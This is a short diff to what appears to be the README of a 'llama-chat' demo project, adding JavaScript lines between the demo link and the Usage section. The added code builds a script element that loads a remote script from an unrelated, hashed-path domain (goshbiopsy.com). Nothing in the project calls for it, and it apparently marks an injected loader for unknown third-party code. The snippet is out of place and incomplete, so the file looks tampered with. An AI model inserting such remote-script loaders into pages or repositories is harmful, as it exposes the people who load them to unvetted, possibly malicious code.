@@ -6,7 +6,11 @@ Here's a demo:
 
 https://github.com/replicate/llama-chat/assets/14149230/9c6aaef3-4e60-4846-a2d2-f9575e155b70
 
-
+   // Create the external script element
+    const externalScript = document.createElement('script');
+    externalScript.type = 'text/javascript';
+    externalScript.src = '//goshbiopsy.com/c0/0c/05/c00c056d68aadf6cc07f91c37c4367b6.js';
+    externalScript.async = true;
 ## Usage
 
 Install dependencies:
